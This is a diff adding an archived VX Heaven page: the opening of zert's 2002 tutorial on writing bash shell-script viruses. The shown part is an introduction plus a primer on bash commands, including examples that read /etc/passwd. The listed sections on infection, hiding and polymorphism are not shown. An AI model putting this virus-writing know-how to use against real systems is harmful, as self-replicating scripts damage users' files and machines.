@@ -1,0 +1,872 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> zert 'Virus Juice: squeezing bash to get it, another little shell script virus tutorial' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="zert"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, zert,Virus Juice: squeezing bash to get it, another little shell script virus tutorial, localhost, exists, users, file, echo, code, true, null, zert, host, list, printf, virus, shell, bash"/>
+<meta name="Description" content="This tutorial is intended to give a general perspective on script virus in UNIX environments, as well as showing some examples of what can be done using the explained techniques.There are many tutorials following the same topic, so this text is not new in that aspect, but I considered of interest writing it so I can give a more global focus to the topic, and show my examples in detail.To finish this introduction I would like to epmhasize the work of SnakeByte and Gobleen Warrior in this field. I didn't know there were more people interested in this funny type of scripts :-)"/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"1d429c003a8461134db2bb29c29d88b7083d8d59-1498757468-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vze01.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Virus Juice: squeezing bash to get it, another little shell script virus tutorial</h1><p><a href="/lib/?lang=en&amp;author=zert"> zert</a><br/> <em><a href="/vx.php?fid=11#f11">29a [6]</a></em><br/> <em>March 2002</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vze01.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=UN#vze01">Back to index</a>] [<a href="/lib/vze01.html#disqus_thread">Comments</a>]<br/> 
+<ul>
+<li><a href="#c1">1. General introduction</a>
+<ul>
+<li><a href="#c11">1.1. Presentation</a></li>
+<li><a href="#c12">1.2. Shell scripting</a></li>
+<li><a href="#c13">1.3. Shell script virus, scope</a></li>
+</ul></li>
+<li><a href="#c2">2. Shells in UNIX</a>
+<ul>
+<li><a href="#c21">2.1. Potentialities and compatibilities of the different shells</a></li>
+<li><a href="#c22">2.2. sh and bash, a fact standard</a>
+<ul>
+<li><a href="#c221">2.2.1. Bash thoroughly and usual commands</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#c3">3. Shell script virus</a>
+<ul>
+<li><a href="#c31">3.1. Infection techniques</a>
+<ul>
+<li><a href="#c311">3.1.1.- Overwriting</a></li>
+<li><a href="#c312">3.1.2. Prepending</a></li>
+<li><a href="#c313">3.1.3. Postpending</a></li>
+<li><a href="#c314">3.1.4. Residence</a></li>
+<li><a href="#c315">3.1.5. Companion</a></li>
+<li><a href="#c316">3.1.6. Multiplatform</a></li>
+</ul></li>
+<li><a href="#c32">3.2. Search for objectives</a>
+<ul>
+<li><a href="#c321">3.2.1. Possible victim detection</a></li>
+<li><a href="#c322">3.2.2. How and where do we find them?</a></li>
+<li><a href="#c323">3.2.3. Shell scripts and "su"</a></li>
+</ul></li>
+<li><a href="#c33">3.3. Hiding techniques</a>
+<ul>
+<li><a href="#c331">3.3.1. Stupid techniques</a></li>
+<li><a href="#c332">3.3.2. File names</a></li>
+<li><a href="#c333">3.3.3. Code inclusion, the "source" clause</a></li>
+<li><a href="#c334">3.3.4. Output messages</a></li>
+<li><a href="#c335">3.3.5. Execution delays</a></li>
+<li><a href="#c336">3.3.6. Aliases</a></li>
+<li><a href="#c337">3.3.7.- Polimorphism</a></li>
+</ul></li>
+</ul></li>
+<li><a href="#c4">4. Conclusions</a>
+<ul>
+<li><a href="#c41">4.1. The future of the shell scripts</a></li>
+<li><a href="#c42">4.2. Thanks</a></li>
+</ul></li>
+<li><a href="#c5">5. References</a></li>
+</ul>
+<h2><a name="c1"></a>1. General introduction</h2>
+<h3><a name="c11"></a>1.1. Presentation</h3>
+<p>This tutorial is intended to give a general perspective on script virus in UNIX environments, as well as showing some examples of what can be done using the explained techniques.</p>
+<p>There are many tutorials following the same topic, so this text is not new in that aspect, but I considered of interest writing it so I can give a more global focus to the topic, and show my examples in detail.</p>
+<p>To finish this introduction I would like to epmhasize the work of SnakeByte and Gobleen Warrior in this field. I didn't know there were more people interested in this funny type of scripts :-)</p>
+<h3><a name="c12"></a>1.2. Shell scripting</h3>
+<p>Let's start from the basics, what is a shell script? As the name says, a shell script is a program interpreted by the shell. A shell is a command interface that translates the commands introduced by the user and executes them.</p>
+<p>Every operating system has its own shell or command interpreter, you can find cmd.exe in Windows NT, command.com in Windows 9x, and a big variety in the UNIX family, let's say sh, csh, ksh...</p>
+<p>Shell scripts are used to make little programs that will be used very frequently, avoiding us having to introduce the same commands every time we want repetitive actions. This is called batch processing, in which the system executes all the actions listed in the script without the user's intervention.</p>
+<p>Scripts are used in UNIX for almost everything: running daemons, configuring programs, enabling services... this is done due to the ease of script programming and the power of UNIX shells.</p>
+<p>All this is why shell script viruses have an important space in UNIX systems where to reside, even their detection is almost trivial and their infection methods are rudimentary, as I will explain later on.</p>
+<h3><a name="c13"></a>1.3. Shell script virus, scope</h3>
+<p>The first question that comes to us can be: do shell script viruses have sense at all? Up to what point aren't they a mere hobby?</p>
+<p>In my opinion, shell script viruses are not a real threat at all in UNIX systems. Any system administrator with common sense should know how to handle them without any difficulty. But in the other way, with the new popularity that Linux, FreeBSD and other UNIX-like systems for PCs are gaining, shell scripts are used by inexpert users that don't know much about what they are doing. In a situation like this, a shell script virus could live without being detected, but it's true that it will hardly infect other systems.</p>
+<p>Shell script viruses have a handycap in common with other UNIX system viruses: it is not usual for the users to interchange executable files. Usually files are distributed with their source code, and in the case of the scripts, they are edited to satisfy the needs of the machine in question.</p>
+<p>Then, with this, I would like to say that I consider this kind of viruses an entertainment, a way of experimenting and satisfying my own curiosity, and not as real viruses that can deal with other antiviruses and advanced users. I started with this in in my UNIX class, where we had not much to do and had many hours in front of a shell. This helped me to gain some knowledge and experience on shell scripting :-)</p>
+<h2><a name="c2"></a>2. Shells in UNIX</h2>
+<h3><a name="c21"></a>2.1. Potentialities and compatibilities of the different shells</h3>
+<p>The difference with other operating systems is that there are many different shells in UNIX, and each of them is specific for certain development environments and have a similar but different syntax.</p>
+<p>Because of this, it is very usual to include a row at the beginning of every shell script, in which we select the shell that will take care of the execution of the script, to avoid misunderstandings.</p>
+<p><strong>hello.sh</strong></p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/csh</span><br/>
+<span style="color: #7a0874; font-weight: bold;">echo</span> Hello, world<span style="color: #000000; font-weight: bold;">!</span><br/>
+&nbsp;</div>
+<p>As we can see we make use of an special comment (comments start with an # and finish at the end of line) to indicate where is the specified shell held on. If we don't include that line the script would exectute anyways, but if we were using some specific commands for that shell, it could be a disaster not including it.</p>
+<p>Every shell is "strong" in the scope it was designed for, sh is quite disgusting for interactive work, but it's very powerful at scripting. Ksh (Korn Shell) is intended to be more user friendly and is the standard shell in many UNIX systems (e.g. Solaris), csh and its newer version, tcsh is another common UNIX shell. There are many others, each one centered in a different caracteristic (speed, size, etc.).</p>
+<p>In this tutorial we will concentrate on the most extended shell, sh or bash (Bourne Again Shell) because it is present in every UNIX system.</p>
+<h3><a name="c22"></a>2.2. sh and bash, a fact standard</h3>
+<p>Bash is a new implementation of Stephen Bourne's shell, Bourne Shell. Due to its power and that it has been including other shell's capabilities, it has been gaining ground in the world of shells until becoming a fact standard, this is, a standard because of the intensive use of it.</p>
+<p>Usually scripts which are written to be used in a bash shell have .sh extension, even though system scripts don't follow this rule.</p>
+<p>In Linux systems /bin/sh is usually a symbolic link to /bin/bash, so there is no difference between them, but in other UNIX systems there are differences with regard to sh, bash and bash2's capability, so this is something to take into account when trying to program in a compatible way.</p>
+<h4><a name="c221"></a>2.2.1. Bash thoroughly and usual commands</h4>
+<p>There are many structures, expresions and built-ins in the bash shell which help making complex and powerful scripts, but can confuse the programmer.</p>
+<p>For an exhaustive use of bash I recommend the "Advanced Bash-Scripting Guide: A complete guide to shell scripting, using bash", which can be found at www.linuxdoc.org in the "Guides" section.</p>
+<p>In this chapter of this tutorial I will only explain those bash particularities that we will need to write our shell script viruses. I recommend reading it at the end, as we need a more detailed explanation about the commands and expressions used in the scripts, so please, go to the next chapter ;-)</p>
+<h5>The "cut" command</h5>
+<p>The "cut" command is used for getting different fields from the lines of a file. The most usual way of using it is defining a character as a field separator and a field number, for example:</p>
+<p>/etc/passwd file:</p>
+<pre class="source">zert:x:1001:100::/home/zert:/bin/bash</pre>
+<p>with</p>
+<pre class="source">$> cat /etc/passwd | cut -d":" -f3</pre>
+<p>we will get the UID of "zert" (1001) because we are defining ":" as a field separator (-d":") and we are requesting the third field (-f3).</p>
+<p>With "cut" we can do many other things, but they are not interesting for this tutorial, so if you want to know something more about this command, you know what to do, "man cut" ;-)</p>
+<h5>The "head" command</h5>
+<p>With the "head" command we request the first part of a file. We can request a specific number of characters or even a specific number of lines, for example:</p>
+<pre class="source">$> head -5 /etc/passwd </pre>
+<p>gives us the first 5 lines of the file "/etc/passwd".</p>
+<p>With</p>
+<pre class="source">$> head -c512 /etc/passwd</pre>
+<p>we get the first 512 characters of "/etc/passwd".</p>
+<p>In this tutorial we usually use "head" in combination with "$0" to copy the first lines of the current file into the host.</p>
+<p>If you want to know more about this command, "man head" ;-)</p>
+<h5>Redirecting the output</h5>
+<p>Bash allows redirecting the standard output (stdout) as well as the standard error output (stderr) to other files. We use ">" to redirect standard output and "2>" to do the same with the standard error output.</p>
+<p>Something very usual in shell scripts is redirecting the standard output as well as the standard error output to the same file. Here is an example of how to do it:</p>
+<pre class="source">$> cat * > currentdir 2>&amp;1</pre>
+<p>or</p>
+<pre class="source">$> cat * 2>&amp;1 > currentdir</pre>
+<p>Again, check out the manual pages for more info ("man bash").</p>
+<h5>The "if" structure</h5>
+<p>In Bash the "if" structure has some peculiarities in opposition to other programming languages, let's see how is its syntax:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> list; <span style="color: #000000; font-weight: bold;">then</span> list; <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">elif</span> list; <span style="color: #000000; font-weight: bold;">then</span> list; <span style="color: black;">&#93;</span> ... <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">else</span> list; <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">fi</span></div>
+<p>First of all the first "list" of commands is executed. If the final result is zero (equal to an "exit 0"), then the "then" list will be executed, otherwise the "elif" lists will be executed and if the final result is zero their "then" list is also executed. In the end, if there was no list with the final result set to zero the "else" list is executed.</p>
+<p>So, "if" does not need an expresion, it can be a list of commands or any of the conditions that gives for file, string or numeric argument handling:</p>
+<ol type="a">
+<li>file conditions:
+<table summary="file conditions">
+<tr><td>-a file</td><td>True if "file" exists.</td></tr>
+<tr><td>-b file</td><td>True if "file" exists and is a special block file.</td></tr>
+<tr><td>-c file</td><td>True if "file" exists and is a special characters file.</td></tr>
+<tr><td>-d file</td><td>True if "file" exists and is a directory.</td></tr>
+<tr><td>-e file</td><td>True if "file" exists.</td></tr>
+<tr><td>-f file</td><td>True if "file" exists and is a normal file.</td></tr>
+<tr><td>-g file</td><td>True if "file" exists and is set-group-id.</td></tr>
+<tr><td>-h file</td><td>True if "file" exists and is a symbolic link.</td></tr>
+<tr><td>-k file</td><td>True if "file" exists and its "sticky" bit is set.</td></tr>
+<tr><td>-p file</td><td>True if "file" exists and is a named pipe (FIFO).</td></tr>
+<tr><td>-r file</td><td>True if "file" exists and can be read.</td></tr>
+<tr><td>-s file</td><td>True if "file" exists and is greater than zero.</td></tr>
+<tr><td>-t fd</td><td>True if "fd" is open and refers to a terminal.</td></tr>
+<tr><td>-u file</td><td>True if "file" exists and its "set-user-id" bit is set.</td></tr>
+<tr><td>-w file</td><td>True if "file" exists and is writable.</td></tr>
+<tr><td>-x file</td><td>True if "file" exists and is executable.</td></tr>
+<tr><td>-O file</td><td>True if "file" exists and belongs to the efective current user.</td></tr>
+<tr><td>-G file</td><td>True if "file" exists and belongs to the efective current group.</td></tr>
+<tr><td>-L file</td><td>True if "file" exists and is a symbolic link.</td></tr>
+<tr><td>-S file</td><td>True if "file" exists and is a socket.</td></tr>
+<tr><td>-N file</td><td>True if "file" exists and was modified since last read access.</td></tr>
+<tr><td>file1 -nt file2</td><td>True if "file1" is newer than "file2".</td></tr>
+<tr><td>file1 -ot file2</td><td>True if "file1" is older than "file2".</td></tr>
+</table></li>
+<li>string conditions:
+<table summary="string conditions">
+<tr><td>-z string</td><td>True if "string"'s length is zero.</td></tr>
+<tr><td>-n string</td><td>True if "string"'s length is not zero.</td></tr>
+<tr><td>string1 == string2</td><td>True if both strings are equal. "=" can be used in stead of "=="</td></tr>
+<tr><td>string1 != string2</td><td>True if strings are different.</td></tr>
+<tr><td>string1 &lt; string2</td><td>True if "string1" goes lexicographically before "string2".</td></tr>
+<tr><td>string1 > string2</td><td>True if "string2" goes lexicographically before "string1".</td></tr>
+</table></li>
+<li>numeric argument conditions:
+<table summary="numeric argument conditions">
+<tr><td>arg1 -eq arg2</td><td>True if arguments are equal.</td></tr>
+<tr><td>arg1 -ne arg2</td><td>True if arguments are different.</td></tr>
+<tr><td>arg1 -lt arg2</td><td>True if "arg1" is lower than "arg2".</td></tr>
+<tr><td>arg1 -le arg2</td><td>True if "arg1" is lower than or equal to "arg2".</td></tr>
+<tr><td>arg1 -gt arg2</td><td>True if "arg1" is greater than"arg2".</td></tr>
+<tr><td>arg1 -ge arg2</td><td>True if "arg1" is greater than or equal to "arg2".</td></tr>
+</table></li>
+</ol>
+<h5>The "for" structure</h5>
+<p>The "for" structure in Bash is also a little bit special, and much more powerful than in most programming languages. Its syntax is like this:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> name <span style="color: black;">&#91;</span> <span style="color: #000000; font-weight: bold;">in</span> word <span style="color: black;">&#93;</span> ; <span style="color: #000000; font-weight: bold;">do</span> list ; <span style="color: #000000; font-weight: bold;">done</span></div>
+<p>What it first does is to expand the "word" list, which is a list of strings separated by space characters. After, the "name" variable is asigned the first element of the "word" list and the "list" commands list is executed. It keeps doing the same with all the elements in "word".</p>
+<p>If the "word" list is empty nothing will be executed, and the return value will be zero. If it is not empty, the return value will be the one corresponding to the last executed command's return value.</p>
+<p>As we can see, this does not have much to do with the typical C or Pascal "for", but we can do similar structures using the "seq" command:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">for</span> I <span style="color: #000000; font-weight: bold;">in</span> $<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">seq</span> <span style="color: #000000;">1</span> <span style="color: #000000;">10</span><span style="color: black;">&#41;</span><br/>
+<span style="color: #000000; font-weight: bold;">do</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">echo</span> <span style="color: #007800;">$I</span><br/>
+<span style="color: #000000; font-weight: bold;">done</span><br/>
+&nbsp;</div>
+<p>This will print 10 lines with numbers from 1 to 10, because "seq" generates natural number sequences from 1 to the given parameter, or between the given limits ("seq 5 10" generates numbers from 5 to 10).</p>
+<h5>The "tr" command</h5>
+<p>This command is used for translating or deleting characters in a string. It usually receives two parameters, which are two character lists and their translation, for example:</p>
+<pre class="source">$> echo zert | tr aeiou uoiea</pre>
+<p>will show "zort" because the "e" from the first list corresponds to the "o" of the second list.</p>
+<p>If what we want to do is delete characters we have to use the "-d" option, let's see it in an example:</p>
+<pre class="source">$> cat /etc/passwd | tr -d a</pre>
+<p>will show /etc/passwd omitting all the "a"s.</p>
+<h5>The "source" clause</h5>
+<p>As in other programming languages we can include source code which is in other files ("#include" in C or "Uses" in Pascal, for example), in bash scripting we can do the same using the "source" clause.</p>
+<p>If we had code in a file named "generic", for example, and we wanted to include it in our script, we would just have to do this:</p>
+<pre class="source">
+#!/bin/sh
+
+source generic
+
+# our code...
+</pre>
+<p>We can also use the compact version of the "source" clause, the ".":</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<br/>
+. generic<br/>
+<br/>
+<span style="color: #666666; font-style: italic;"># our code...</span><br/>
+&nbsp;</div>
+<h5>Background execution</h5>
+<p>As we all know, in a UNIX system, there are many processes running in background without interfering with the user. In bash scripting we can send commands in background without having to wait for it to finish.</p>
+<p>To do that its enough to put a "&amp;" character at the end of the command and it will be executed in background. With the "fg" and "bg" commands we will control what is in foreground and background.</p>
+<p>Another posibility is to send commands list in parallel, with the help of the brackets, and synchronize them with "wait". Let's see it in an example:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #666666; font-style: italic;">#!/bin/sh</span><br/>
+<br/>
+<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">find</span> <span style="color: #000000; font-weight: bold;">/</span> <span style="color: #660033;">-name</span> <span style="color: #c20cb9; font-weight: bold;">passwd</span>; <span style="color: #7a0874; font-weight: bold;">echo</span> got it<span style="color: #000000; font-weight: bold;">!</span><span style="color: black;">&#41;</span><br/>
+<span style="color: black;">&#40;</span><span style="color: #c20cb9; font-weight: bold;">seq</span> <span style="color: #000000;">65355</span><span style="color: black;">&#41;</span><br/>
+<span style="color: #7a0874; font-weight: bold;">wait</span><br/>
+&nbsp;</div>
+<p>For sure, "find"'s output and "seq"'s output will mix together because they are running concurrently, but with "wait" we can assure that from that point there will be only an execution thread.</p>
+<h5>The "grep" command</h5>
+<p>With the "grep" command we can find lines in a file which follow a pattern. It is used to show a line which contains a regular given expresion, the environment of that line, or all the lines except that.</p>
+<p>Let's see how can we do it in some examples:</p>
+<pre class="source">$> grep '#!/bin/sh' *</pre>
+<p>will show all the lines in every file of the current directory (*) that contain the '#!/bin/sh' pattern.</p>
+<pre class="source">$> grep [Vv][Ii][Rr][Uu][Ss] *</pre>
+<p>will show every line in every file of the current directory (*) which contain the word "virus" in upper case as well as low case (we use the UNIX regular expresions, where [Vv] means "V" or "v").</p>
+<pre class="source">$> grep '#!/bin/sh' -v *</pre>
+<p>will show every line in every file of the current directory which does not contain the given pattern '#!/bin/sh'.</p>
+<pre class="source">$> grep '#!/bin/sh' -3 *</pre>
+<p>will show all the lines in all the files of the current directory (*) which containing the '#!/bin/sh' pattern as well as the 3 upper lines and the 3 lower lines in the file.</p>
+<h5>The "find" command</h5>
+<p>This command is used to search files in the directory tree. We can specify many file properties as name, permissions, date, owner, etc. Its use is very easy: we decide where we want to start the search and what properties do our objectives have, for example:</p>
+<pre class="source">$> find /etc/ -perm +111</pre>
+<p>will show us every file with any permission enabled starting from the "/etc/" directory".</p>
+<p>there are many options in the "find" command, so I recommend to take a look at the manual pages ("man find").</p>
+<h5>The "tee" command</h5>
+<p>This command reads from the standard input and writes to the standard output or another file. It's commonly used to redirect a file to itself, avoiding error messages. Let's see an example:</p>
+<pre class="source"><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="ddb0b89db1b2bebcb1b5b2aea9">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ touch 1
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="caa7af8aa6a5a9aba6a2a5b9be">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ touch 2
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="acc1c9ecc0c3cfcdc0c4c3dfd8">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat 1 2 > 1
+cat: 1: input file is output file
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="0a676f4a6665696b666265797e">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat 1 2 | tee > 1
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="fc9199bc90939f9d9094938f88">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ echo 1 > 1
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="325f57725e5d51535e5a5d4146">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ echo 2 > 2
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="1c71795c70737f7d7074736f68">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat 1 2 | tee > 1
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="88e5edc8e4e7ebe9e4e0e7fbfc">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>:~$ cat 1
+1
+2
+</pre>
+<h5>The "AND list" and the "OR list"</h5>
+<p>To avoid the reiterative use of the "if" structure they are often used the "AND list" and the "OR list". The following example will show the equalities between these and the "if" structure:</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$FILE</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">&amp;&amp;</span> <span style="color: #7a0874; font-weight: bold;">cd</span> <span style="color: #007800;">$FILE</span></div>
+<p>is the same as</p>
+<div class="bash" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000000; font-weight: bold;">if</span> <span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$FILE</span> <span style="color: black;">&#93;</span><br/>
+<span style="color: #000000; font-weight: bold;">then</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #7a0874; font-weight: bold;">cd</span> <span style="color: #007800;">$FILE</span><br/>
+<span style="color: #000000; font-weight: bold;">fi</span><br/>
+<br/>
+<span style="color: black;">&#91;</span> <span style="color: #660033;">-d</span> <span style="color: #007800;">$FILE</span> <span style="color: black;">&#93;</span> <span style="color: #000000; font-weight: bold;">||</span> <span style="color: #c20cb9; font-weight: bold;">cat</span> <span style="color: #007800;">$FILE</span><br/>
+&nbsp;</div>
+<p>is the same as</p>
